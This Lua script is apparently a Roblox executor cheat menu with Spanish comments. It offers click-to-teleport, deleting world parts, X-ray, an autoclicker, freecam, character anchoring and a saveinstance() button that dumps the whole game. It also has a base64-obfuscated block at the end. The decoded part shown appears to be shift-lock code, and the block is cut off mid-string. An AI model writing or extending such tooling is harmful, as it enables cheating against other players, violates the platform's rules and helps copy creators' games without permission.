local function waitForMainTab()
    while not MainTab do
        task.wait(0.1)  -- Esperar hasta que MainTab esté disponible
    end
end

-- Llamar a waitForMainTab antes de crear los toggles
task.spawn(function()
    waitForMainTab()

    -- Crear los toggles en MainTab
    pcall(function()
        MainTab:CreateToggle({
            Name = "Control Click Teleport",
            CurrentValue = false,
            Flag = "TeleportToggle",
            Callback = function(v) teleportEnabled = v end,
        })

        MainTab:CreateToggle({
            Name = "Alt + Click Delete",
            CurrentValue = false,
            Flag = "AltClickDeleteToggle",
            Callback = function(v) deleteEnabled = v end,
        })
    end)
end)

-- Input
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.LeftControl then ctrlPressed = true end
        if input.KeyCode == Enum.KeyCode.LeftAlt then altPressed = true end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.LeftControl then ctrlPressed = false end
        if input.KeyCode == Enum.KeyCode.LeftAlt then altPressed = false end
    end
end)

-- Click handler
mouse.Button1Down:Connect(function()
    local target = mouse.Target
    if teleportEnabled and ctrlPressed and humanoidRootPart then
        humanoidRootPart.CFrame = CFrame.new(mouse.Hit.Position)
    end
    if deleteEnabled and altPressed and target and target:IsA("BasePart") then
        target:Destroy()
    end
end)


---Ver FPS--
local fpsGui
local FpsLabel
local fpsConnection
local selectedColor = Color3.fromRGB(44, 255, 8)

-- Puedes cambiar esta posición si quieres mover el visor manualmente
local fpsPosition = UDim2.new(0.786, 0, 0, 0) -- Esquina superior derecha

-- Toggle para mostrar u ocultar el visor de FPS
Toggle = MainTab:CreateToggle({
    Name = "Mostrar FPS",
    CurrentValue = false,
    Flag = "FPS_Toggle",
    Callback = function(state)
        if state then
            -- Crear GUI de FPS
            fpsGui = Instance.new("ScreenGui")
            FpsLabel = Instance.new("TextLabel")

            fpsGui.Name = "FPSGui"
            fpsGui.ResetOnSpawn = false
            fpsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            fpsGui.Parent = game.CoreGui

            FpsLabel.Name = "FpsLabel"
            FpsLabel.Parent = fpsGui
            FpsLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            FpsLabel.BackgroundTransparency = 1
            FpsLabel.Position = fpsPosition
            FpsLabel.Size = UDim2.new(0, 125, 0, 25)
            FpsLabel.Font = Enum.Font.SourceSans
            FpsLabel.TextColor3 = selectedColor
            FpsLabel.TextScaled = true
            FpsLabel.Text = "FPS: ..."
            FpsLabel.TextWrapped = true

            fpsConnection = RunService.RenderStepped:Connect(function(dt)
                if not FpsLabel or not FpsLabel.Parent then
                    if fpsConnection then fpsConnection:Disconnect() end
                    return
                end
                FpsLabel.Text = "FPS: " .. math.round(1 / dt)
            end)
        else
            -- Eliminar GUI y desconectar
            if fpsGui then fpsGui:Destroy() fpsGui = nil end
            if fpsConnection then fpsConnection:Disconnect() fpsConnection = nil end
        end
    end,
})

-- ColorPicker para cambiar el color del texto FPS
MainTab:CreateColorPicker({
    Name = "Color de FPS",
    Color = selectedColor,
    Flag = "FPS_Color",
    Callback = function(color)
        selectedColor = color
        if FpsLabel then
            FpsLabel.TextColor3 = selectedColor
        end
    end,
})

-- Slider para cambiar el tamaño del texto FPS
MainTab:CreateSlider({
    Name = "Tamaño del texto FPS",
    Range = {10, 50},
    Increment = 1,
    Suffix = "+",
    CurrentValue = 20,
    Callback = function(size)
        if FpsLabel then
            FpsLabel.TextScaled = false -- Para usar TextSize directamente
            FpsLabel.TextSize = size
        end
    end
})




----Guardar juegos---

Button = MainTab:CreateButton({

    Name = "Guardar juego",
    Callback = function()
        saveinstance();
    end,
 })
 





----Autoclicker----

local VirtualInputManager = game:GetService("VirtualInputManager")

-- Estados
local autoClicking = false
local toggleEnabled = false
local clickDelay = 0.1 -- valor inicial, ajustable por el slider

-- Bucle del autoclicker
task.spawn(function()
	while task.wait() do
		if autoClicking and toggleEnabled then
			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
		end
		task.wait(clickDelay)
	end
end)

-- Toggle (maestro)
AutoClickerToggle = MainTab:CreateToggle({
	Name = "Auto Clicker (primero activar)",
	CurrentValue = false,
	Flag = "AutoClickerToggle",
	Callback = function(Value)
		toggleEnabled = Value
		if not Value then
			autoClicking = false
		end
	end,
})

-- Keybind (solo funciona si el toggle está activo)
MainTab:CreateKeybind({
	Name = "Bind Auto Click",
	CurrentKeybind = "E",
	HoldToInteract = false,
	Flag = "AutoClickerKeybind",
	Callback = function()
		if toggleEnabled then
			autoClicking = not autoClicking
		end
	end,
})

-- Slider para velocidad (menor = más rápido)
MainTab:CreateSlider({
	Name = "Velocidad AutoClicker",
	Range = {0, 1}, -- 0.01 = muy rápido, 1 = más lento
	Increment = 0.01,
	Suffix = "s",
	CurrentValue = clickDelay,
	Flag = "ClickDelaySlider",
	Callback = function(Value)
		clickDelay = Value
	end,
})
----Camara libre---



local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local freecamEnabled = false
local moveDirection = Vector3.zero
local camRotation = Vector2.new()
local camPosition = Vector3.zero
local speed = 1.5
local keysHeld = {}
local toggleActive = false
local sensitivity = 0.005

local lastTouchPosition = nil
local guiFrames = nil -- los botones de movimiento

-- Congelar personaje
local function FreezeCharacter()
	local char = player.Character
	if char then
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = false
			humanoid.WalkSpeed = 0
			humanoid.JumpPower = 0
		end
	end
end

-- Restaurar personaje
local function UnfreezeCharacter()
	local char = player.Character
	if char then
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid.AutoRotate = true
			humanoid.WalkSpeed = 16
			humanoid.JumpPower = 50
		end
	end
end

-- Crear GUI táctil
local function CreateTouchGui()
	guiFrames = Instance.new("ScreenGui")
	guiFrames.Name = "MobileMovementGui"
	guiFrames.ResetOnSpawn = false
	guiFrames.Parent = player:WaitForChild("PlayerGui")

	local function CreateButton(name, position, keycode)
		local button = Instance.new("TextButton")
		button.Name = name
		button.Size = UDim2.new(0, 60, 0, 60)
		button.Position = position
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		button.Text = name
		button.TextColor3 = Color3.new(1, 1, 1)
		button.TextScaled = true
		button.Parent = guiFrames

		button.MouseButton1Down:Connect(function()
			keysHeld[keycode] = true
		end)
		button.MouseButton1Up:Connect(function()
			keysHeld[keycode] = false
		end)
	end

	-- Crear los botones
	CreateButton("W", UDim2.new(0, 100, 1, -200), Enum.KeyCode.W)
	CreateButton("A", UDim2.new(0, 40, 1, -140), Enum.KeyCode.A)
	CreateButton("S", UDim2.new(0, 100, 1, -140), Enum.KeyCode.S)
	CreateButton("D", UDim2.new(0, 160, 1, -140), Enum.KeyCode.D)
end

-- Destruir GUI táctil
local function RemoveTouchGui()
	if guiFrames then
		guiFrames:Destroy()
		guiFrames = nil
	end
end

-- Teclas presionadas
UserInputService.InputBegan:Connect(function(input, gpe)
	if not gpe and freecamEnabled then
		if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Q then
			keysHeld[input.KeyCode] = true
		end
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if freecamEnabled then
		if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Q then
			keysHeld[input.KeyCode] = false
		end
	end
end)

-- Capturar movimiento de cámara con Touch
UserInputService.TouchMoved:Connect(function(input, gpe)
	if freecamEnabled and not gpe then
		if lastTouchPosition then
			local delta = input.Position - lastTouchPosition
			camRotation = camRotation + Vector2.new(-delta.Y, -delta.X) * sensitivity * 0.1
			camRotation = Vector2.new(math.clamp(camRotation.X, -math.pi/2, math.pi/2), camRotation.Y)
		end
		lastTouchPosition = input.Position
	end
end)

UserInputService.TouchEnded:Connect(function(input, gpe)
	if not gpe then
		lastTouchPosition = nil
	end
end)

-- Calcular hacia dónde moverse
local function CalculateMoveVector()
	local moveVec = Vector3.zero

	if keysHeld[Enum.KeyCode.W] then moveVec = moveVec + Vector3.new(0, 0, -1) end
	if keysHeld[Enum.KeyCode.S] then moveVec = moveVec + Vector3.new(0, 0, 1) end
	if keysHeld[Enum.KeyCode.A] then moveVec = moveVec + Vector3.new(-1, 0, 0) end
	if keysHeld[Enum.KeyCode.D] then moveVec = moveVec + Vector3.new(1, 0, 0) end
	if keysHeld[Enum.KeyCode.E] then moveVec = moveVec + Vector3.new(0, 1, 0) end
	if keysHeld[Enum.KeyCode.Q] then moveVec = moveVec + Vector3.new(0, -1, 0) end

	return moveVec
end

local function EnableFreecam()
	if not freecamEnabled then
		freecamEnabled = true
		camera.CameraType = Enum.CameraType.Scriptable
		camPosition = camera.CFrame.Position

		local _, yaw = camera.CFrame:ToOrientation()
		local pitch = math.asin(-camera.CFrame.LookVector.Y)
		camRotation = Vector2.new(pitch, yaw)

		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false

		FreezeCharacter()

		if UserInputService.TouchEnabled then
			CreateTouchGui()
		end

		RunService:BindToRenderStep("Freecam", Enum.RenderPriority.Camera.Value, function(dt)
			if not UserInputService.TouchEnabled then
				local delta = UserInputService:GetMouseDelta()
				camRotation = camRotation + Vector2.new(-delta.Y, -delta.X) * sensitivity
				camRotation = Vector2.new(math.clamp(camRotation.X, -math.pi/2, math.pi/2), camRotation.Y)
			end

			local yawCF = CFrame.Angles(0, camRotation.Y, 0)
			local pitchCF = CFrame.Angles(camRotation.X, 0, 0)
			local moveVec = CalculateMoveVector()

			if moveVec.Magnitude > 0 then
				moveVec = (yawCF * pitchCF):VectorToWorldSpace(moveVec.Unit) * speed
				camPosition = camPosition + moveVec
			end

			camera.CFrame = yawCF * pitchCF + camPosition
		end)
	end
end

local function DisableFreecam()
	if freecamEnabled then
		freecamEnabled = false
		RunService:UnbindFromRenderStep("Freecam")
		camera.CameraType = Enum.CameraType.Custom

		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = true

		UnfreezeCharacter()
		RemoveTouchGui()
	end
end

-- Toggle de cámara
MainTab:CreateToggle({
	Name = "Camara libre",
	CurrentValue = false,
	Flag = "CamaraL",
	Callback = function(Value)
		toggleActive = Value
		if Value then
			EnableFreecam()
		else
			DisableFreecam()
		end
	end,
})

-- Keybind de activación
MainTab:CreateKeybind({
	Name = "Bind Camara Libre",
	CurrentKeybind = "P",
	HoldToInteract = false,
	Flag = "CamaraLKeybind",
	Callback = function()
		if toggleActive then
			if freecamEnabled then
				DisableFreecam()
			else
				EnableFreecam()
			end
		end
	end,
})

-- Slider de sensibilidad
MainTab:CreateSlider({
	Name = "Sensibilidad de cámara",
	Range = {0.001, 0.049},
	Increment = 0.001,
	Suffix = "Sensibilidad",
	CurrentValue = sensitivity,
	Flag = "CameraSensitivity",
	Callback = function(Value)
		sensitivity = Value
	end,
})


-- Slider de velocidad
MainTab:CreateSlider({
	Name = "Velocidad de camara",
	Range = {0.1, 10},
	Increment = 0.1,
	Suffix = "Velocidad",
	CurrentValue =  speed,
	Flag = "speed",
	Callback = function(Value)
		 speed  = Value
	end,
})























--XRAY----

-- Tabla para guardar las transparencias originales
local originalTransparency = {}

-- Función que activa o desactiva el Xray
function ToggleXray(state)
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") then
            if not object:IsA("Model") or not object:FindFirstChild("Humanoid") then
                if not object:IsA("Part") or object.Name ~= "SpawnLocation" then
                    if not (object.Parent and object.Parent:FindFirstChild("HumanoidRootPart")) then
                        if state then
                            -- Guardar la transparencia original si no está guardada ya
                            if originalTransparency[object] == nil then
                                originalTransparency[object] = object.Transparency
                            end
                            object.Transparency = 0.8
                        else
                            -- Restaurar la transparencia original si se había guardado
                            if originalTransparency[object] ~= nil then
                                object.Transparency = originalTransparency[object]
                                originalTransparency[object] = nil
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Crear el toggle de Xray
XrayToggle = MainTab:CreateToggle({
    Name = "Xray", 
    CurrentValue = false,
    Callback = function(state)
        ToggleXray(state)
    end
})



----Anclar----

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")



getgenv().AnchoredStatus = false
local anchorConnection

-- Función para anclar o desanclar todas las partes del personaje
local function setAnchored(state)
    local character = LocalPlayer.Character
    if character then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = state
            end
        end
    end
end

-- Toggle de Rayfield para activar o desactivar el anclaje
MainTab:CreateToggle({
    Name = "Anclar Personaje",
    CurrentValue = false,
    Flag = "AnchorToggle",
    Callback = function(state)
        getgenv().AnchoredStatus = state
        if state then
            setAnchored(true)
            -- Opcional: mantener anclado por si muere o respawnea
            anchorConnection = RunService.Heartbeat:Connect(function()
                if getgenv().AnchoredStatus then
                    setAnchored(true)
                end
            end)
        else
            setAnchored(false)
            if anchorConnection then
                anchorConnection:Disconnect()
                anchorConnection = nil
            end
        end
    end,
})



--Shader--


-- Referencia a Lighting

-- Variables para guardar el estado original
local originalSettings = {
    Brightness = nil,
    ExposureCompensation = nil,
    ClockTime = nil,
    Sky = nil,
    Effects = {},
}

-- Función para guardar el estado actual de Lighting
local function SaveLightingState()
    -- Guardar solo si no ha sido guardado previamente
    originalSettings.Brightness = Lighting.Brightness
    originalSettings.ExposureCompensation = Lighting.ExposureCompensation
    originalSettings.ClockTime = Lighting.ClockTime

    -- Guardar efectos y cielo actuales
    originalSettings.Effects = {}
    for _, v in ipairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") then
            table.insert(originalSettings.Effects, v:Clone()) -- Guardar clones para restaurar
        elseif v:IsA("Sky") then
            originalSettings.Sky = v:Clone() -- Guardar el objeto cielo
        end
    end
end

-- Función para restaurar el estado original
local function RestoreLightingState()
    -- Eliminar efectos actuales
    for _, v in ipairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") or v:IsA("Sky") then
            v:Destroy()
        end
    end

    -- Restaurar valores originales
    Lighting.Brightness = originalSettings.Brightness
    Lighting.ExposureCompensation = originalSettings.ExposureCompensation
    Lighting.ClockTime = originalSettings.ClockTime

    -- Restaurar cielo
    if originalSettings.Sky then
        originalSettings.Sky.Parent = Lighting
    end

    -- Restaurar efectos
    for _, effect in ipairs(originalSettings.Effects) do
        if effect.Parent == nil then
            effect.Parent = Lighting
        end
    end
end

-- Función para aplicar los shaders
local function ApplyShaders()
    -- Crear y aplicar los efectos de shaders
    local Sky = Instance.new("Sky")
    local Bloom = Instance.new("BloomEffect")
    local Blur = Instance.new("BlurEffect")
    local ColorC = Instance.new("ColorCorrectionEffect")
    local SunRays = Instance.new("SunRaysEffect")

    -- Ajustes visuales
    Lighting.Brightness = 2.25
    Lighting.ExposureCompensation = 0.1
    Lighting.ClockTime = 17.55

    -- Configuración del cielo y efectos
    Sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
    Sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
    Sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
    Sky.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
    Sky.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
    Sky.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
    Sky.StarCount = 5000
    Sky.SunAngularSize = 5
    Sky.Parent = Lighting

    Bloom.Intensity = 0.3
    Bloom.Size = 10
    Bloom.Threshold = 0.8
    Bloom.Parent = Lighting

    Blur.Size = 5
    Blur.Parent = Lighting

    ColorC.Brightness = 0
    ColorC.Contrast = 0.1
    ColorC.Saturation = 0.25
    ColorC.TintColor = Color3.fromRGB(255, 255, 255)
    ColorC.Parent = Lighting

    SunRays.Intensity = 0.1
    SunRays.Spread = 0.8
    SunRays.Parent = Lighting
end

-- Estado del shader
local shadersEnabled = false

-- Toggle para activar/desactivar shaders
toggleShader = MainTab:CreateToggle({
    Name = "Shader",
    Callback = function()
        shadersEnabled = not shadersEnabled
        if shadersEnabled then
            SaveLightingState()  -- Guardamos el estado antes de aplicar los shaders
            ApplyShaders()       -- Activamos los shaders
        else
            RestoreLightingState()  -- Restauramos el estado anterior
        end
    end
})

local Lighting = game:GetService("Lighting")

-- Guardar configuración original
local originalClockTime = Lighting.ClockTime
local userSelectedTime = originalClockTime
local isCustomTimeEnabled = false

-- Toggle para activar/desactivar la hora personalizada
MainTab:CreateToggle({
   Name = "Activar hora personalizada",
   CurrentValue = false,
   Callback = function(state)
       isCustomTimeEnabled = state
       if state then
           Lighting.ClockTime = userSelectedTime
       else
           Lighting.ClockTime = originalClockTime
       end
   end,
})

-- Slider para cambiar el tiempo del juego
MainTab:CreateSlider({
   Name = "Hora del juego",
   Range = {0, 24},
   Increment = 0.1,
   Suffix = "h",
   CurrentValue = originalClockTime,
   Callback = function(value)
       userSelectedTime = value
       if isCustomTimeEnabled then
           Lighting.ClockTime = value
       end
   end,
})


---Shiftlock



-- Función para decodificar Base64
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function base64decode(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

-- Aquí va el script codificado en base64
local encoded = [[
LS0gU2VydmljaW9zCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKbG9jYWwgU291bmRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJTb3VuZFNlcnZpY2UiKQpsb2NhbCBWb2ljZUNoYXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJWb2ljZUNoYXRTZXJ2aWNlIikKCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCmxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQpsb2NhbCByb290ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCgotLSBTaGlmdGxvY2sgdmFyaWFibGVzCmxvY2FsIHNoaWZ0bG9ja0VuYWJsZWQgPSBmYWxzZQpsb2NhbCBzaGlmdGxvY2tLZXliaW5kID0gRW51bS5LZXlDb2RlLlEKbG9jYWwgaXNBY3RpdmUgPSBmYWxzZQpsb2NhbCBjYW1lcmFDb25uZWN0aW9uID0gbmlsCgotLSBHVUkgU2hpZnRsb2NrCmxvY2FsIFNoaWZ0bG9ja0d1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKU2hpZnRsb2NrR3VpLk5hbWUgPSAiU2hpZnRsb2NrR1VJIgpTaGlmdGxvY2tHdWkuUmVzZXRPblNwYXduID0gZmFsc2UKU2hpZnRsb2NrR3VpLlpJbmRleEJlaGF2aW9yID0gRW51bS5aSW5kZXhCZWhhdmlvci5TaWJsaW5nClNoaWZ0bG9ja0d1aS5QYXJlbnQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQoKbG9jYWwgQnV0dG9uID0gSW5zdGFuY2UubmV3KCJJbWFnZUJ1dHRvbiIpCkJ1dHRvbi5OYW1lID0gIlNoaWZ0bG9ja0J1dHRvbiIKQnV0dG9uLlBhcmVudCA9IFNoaWZ0bG9ja0d1aQpCdXR0b24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC4wNjM2LCAwLCAwLjA2NjEsIDApCkJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjkyMTksIDAsIDAuNTUyMywgMCkKQnV0dG9uLlNpemVDb25zdHJhaW50ID0gRW51bS5TaXplQ29uc3RyYWludC5SZWxhdGl2ZVhYCkJ1dHRvbi5WaXNpYmxlID0gZmFsc2UKCmxvY2FsIFN0YXRlTGFiZWxGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpTdGF0ZUxhYmVsRnJhbWUuUGFyZW50ID0gQnV0dG9uClN0YXRlTGFiZWxGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApClN0YXRlTGFiZWxGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41ClN0YXRlTGFiZWxGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm5ldygwLCAwLCAwKQoKbG9jYWwgU3RhdGVMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKU3RhdGVMYWJlbC5QYXJlbnQgPSBTdGF0ZUxhYmVsRnJhbWUKU3RhdGVMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApClN0YXRlTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKU3RhdGVMYWJlbC5UZXh0ID0gIk9GRiIKU3RhdGVMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQpTdGF0ZUxhYmVsLlRleHRTY2FsZWQgPSB0cnVlClN0YXRlTGFiZWwuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zQm9sZAoKbG9jYWwgQ3Jvc3NoYWlyID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQpDcm9zc2hhaXIuUGFyZW50ID0gU2hpZnRsb2NrR3VpCkNyb3NzaGFpci5TaXplID0gVURpbTIubmV3KDAsIDMwLCAwLCAzMCkKQ3Jvc3NoYWlyLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE1LCAwLjUsIC0xNSkKQ3Jvc3NoYWlyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCkNyb3NzaGFpci5UZXh0ID0gIk8iCkNyb3NzaGFpci5UZXh0U2NhbGVkID0gdHJ1ZQpDcm9zc2hhaXIuVGV4dENvbG9yMyA9IENvbG9yMy5uZXcoMSwgMSwgMSkKQ3Jvc3NoYWlyLlZpc2libGUgPSBmYWxzZQoKLS0gRnVuY2lvbmVzIFNoaWZ0bG9jawpsb2NhbCBmdW5jdGlvbiBVcGRhdGVJbWFnZShzdGF0ZSkKCVN0YXRlTGFiZWwuVGV4dCA9IHN0YXRlCmVuZAoKbG9jYWwgZnVuY3Rpb24gVXBkYXRlQXV0b1JvdGF0ZShzdGF0ZSkKCWlmIGh1bWFub2lkIHRoZW4KCQlodW1hbm9pZC5BdXRvUm90YXRlID0gc3RhdGUKCWVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIEFuaW1hdGVCdXR0b25QcmVzcygpCglsb2NhbCB0d2VlbkluZm8gPSBUd2VlbkluZm8ubmV3KDAuMTUsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KQoJbG9jYWwgc2hyaW5rU2l6ZSA9IEJ1dHRvbi5TaXplIC0gVURpbTIubmV3KDAuMDEsIDAsIDAuMDEsIDApCglsb2NhbCB0d2VlblNocmluayA9IFR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLCB0d2VlbkluZm8sIHsgU2l6ZSA9IHNocmlua1NpemUgfSkKCWxvY2FsIHR3ZWVuR3JvdyA9IFR3ZWVuU2VydmljZTpDcmVhdGUoQnV0dG9uLCB0d2VlbkluZm8sIHsgU2l6ZSA9IFVEaW0yLm5ldygwLjA2MzYsIDAsIDAuMDY2MSwgMCkgfSkKCXR3ZWVuU2hyaW5rOlBsYXkoKQoJdHdlZW5TaHJpbmsuQ29tcGxldGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCXR3ZWVuR3JvdzpQbGF5KCkKCWVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBTaGlmdExvY2tUb2dnbGUoKQoJaWYgbm90ICgoY2FtZXJhLkNhbWVyYVN1YmplY3QgPT0gaHVtYW5vaWQgb3IgY2FtZXJhLkNhbWVyYVN1YmplY3QgPT0gcm9vdCkgYW5kIGNhbWVyYS5DYW1lcmFUeXBlID09IEVudW0uQ2FtZXJhVHlwZS5DdXN0b20pIHRoZW4KCQlyZXR1cm4KCWVuZAoKCUFuaW1hdGVCdXR0b25QcmVzcygpCgoJaWYgbm90IGlzQWN0aXZlIHRoZW4KCQlpc0FjdGl2ZSA9IHRydWUKCQlVcGRhdGVBdXRvUm90YXRlKGZhbHNlKQoJCVVwZGF0ZUltYWdlKCJPTiIpCgkJQ3Jvc3NoYWlyLlZpc2libGUgPSB0cnVlCgkJVXNlcklucHV0U2VydmljZS5Nb3VzZUljb25FbmFibGVkID0gZmFsc2UKCQlVc2VySW5wdXRTZXJ2aWNlLk1vdXNlQmVoYXZpb3IgPSBFbnVtLk1vdXNlQmVoYXZpb3IuTG9ja0NlbnRlcgoKCQljYW1lcmFDb25uZWN0aW9uID0gUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQlpZiBjaGFyYWN0ZXIgYW5kIHJvb3QgYW5kIGNhbWVyYSB0aGVuCgkJCQlsb2NhbCBkaXJlY3Rpb24gPSBjYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IKCQkJCWxvY2FsIGZsYXREaXJlY3Rpb24gPSBWZWN0b3IzLm5ldyhkaXJlY3Rpb24uWCwgMCwgZGlyZWN0aW9uLlopCgkJCQlpZiBmbGF0RGlyZWN0aW9uLk1hZ25pdHVkZSA+IDAgdGhlbgoJCQkJCXJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhyb290LlBvc2l0aW9uLCByb290LlBvc2l0aW9uICsgZmxhdERpcmVjdGlvbikKCQkJCWVuZAoJCQllbmQKCQllbmQpCgllbHNlCgkJaXNBY3RpdmUgPSBmYWxzZQoJCVVwZGF0ZUF1dG9Sb3RhdGUodHJ1ZSkKCQlVcGRhdGVJbWFnZSgiT0ZGIikKCQlDcm9zc2hhaXIuVmlzaWJsZSA9IGZhbHNlCgkJVXNlcklucHV0U2VydmljZS5Nb3VzZUljb25FbmFibGVkID0gdHJ1ZQoJCVVzZXJJbnB1dFNlcnZpY2UuTW91c2VCZWhhdmlvciA9IEVudW0uTW91c2VCZWhhdmlvci5EZWZhdWx0CgoJCWlmIGNhbWVyYUNvbm5lY3Rpb24gdGhlbgoJCQljYW1lcmFDb25uZWN0aW9uOkRpc2Nvbm5lY3QoKQoJCQljYW1lcmFDb25uZWN0aW9uID0gbmlsCgkJZW5kCgllbmQKZW5kCgpwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGFyKQoJY2hhcmFjdGVyID0gY2hhcgoJaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCglyb290ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCglpZiBpc0FjdGl2ZSB0aGVuCgkJVXBkYXRlQXV0b1JvdGF0ZShmYWxzZSkKCWVuZAplbmQpCgpCdXR0b24uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCglpZiBzaGlmdGxvY2tFbmFibGVkIHRoZW4KCQlTaGlmdExvY2tUb2dnbGUoKQoJZW5kCmVuZCkKClVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBncCkKCWlmIGdwIHRoZW4gcmV0dXJuIGVuZAoJaWYgbm90IFVzZXJJbnB1dFNlcnZpY2UuVG91Y2hFbmFibGVkIGFuZCBzaGlmdGxvY2tFbmFibGVkIGFuZCBpbnB1dC5LZXlDb2RlID09IHNoaWZ0bG9ja0tleWJpbmQgdGhlbgoJCVNoaWZ0TG9ja1RvZ2dsZSgpCgllbmQKZW5kKQoKVXBkYXRlSW1hZ2UoIk9GRiIpCgotLSBUb2dnbGUgU2hpZnRsb2NrCk1haW5UYWI6Q3JlYXRlVG9nZ2xlKHsKCU5hbWUgPSAiU2hpZnRsb2NrIFEgcGFyYSBhY3RpdmFyIiwKC